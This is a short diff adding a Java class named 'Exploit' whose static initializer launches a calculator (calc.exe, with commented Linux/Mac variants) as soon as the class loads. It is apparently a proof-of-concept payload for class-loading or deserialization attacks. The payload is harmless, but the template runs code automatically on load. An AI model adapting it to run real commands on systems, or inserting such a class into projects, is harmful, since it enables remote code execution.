@@ -1,0 +1,16 @@
+import java.lang.Runtime;
+import java.lang.Process;
+
+public class Exploit {
+    static {
+        try {
+            // Для Windows
+            Runtime.getRuntime().exec("calc.exe");
+            // Для Linux/Mac
+            // Runtime.getRuntime().exec("gnome-calculator");
+            // Runtime.getRuntime().exec("open -a Calculator");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
